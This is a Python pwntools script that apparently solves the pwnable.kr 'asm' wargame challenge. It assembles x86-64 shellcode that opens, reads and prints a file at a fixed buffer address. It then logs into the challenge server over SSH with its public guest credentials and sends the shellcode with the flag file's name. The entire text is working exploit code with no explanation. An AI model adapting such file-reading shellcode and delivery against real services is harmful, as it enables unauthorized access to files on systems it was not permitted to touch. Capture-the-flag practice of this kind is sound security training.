#!/bin/python3
from pwn import *

buf = 0x41414000
context.arch = "amd64"
context.os = "linux"
stub_len = 45
reset_registers = """
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
"""
asm_code_template = """
{reset_registers}
add rax, 2
add rdi, {buf}
xor rsi, rsi
syscall

xor rdi, rdi
add rdi, rax
xor rax, rax
xor rsi, rsi
add rsi, {buf}
xor rdx, rdx
add rdx, 100
syscall

{reset_registers}
add rax, 1
add rdi, 1
add rsi, {buf}
add rdx, 100
syscall
"""
asm_code_template1 = """
xor rax, rax
add rax, 2  
xor rdi, rdi
add rdi, {buf}
xor rsi, rsi  
syscall

add rax, 48
mov byte [{buf}], al

{reset_registers}
add rax, 1
add rdi, 1
add rsi, {buf}
add rdx, 100
syscall
"""
asm_code = asm_code_template.format(buf=buf, reset_registers=reset_registers)
shellcode_len = len(asm(asm_code))
buf = buf + stub_len + shellcode_len + 1
# ------------------------------------------------------------------------------------------------------------------------------------------


asm_code = asm_code_template.format(buf=buf, reset_registers=reset_registers)
shellcode = asm(asm_code)
print(b'\x00' in shellcode)
print(shellcode)
print(len(shellcode), shellcode_len)


s = ssh(host="pwnable.kr", user="asm", port=2222, password="guest")
io = s.remote('0', 9026)
file_name = b"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00"
io.recv()
io.sendline(shellcode + file_name)
io.interactive()
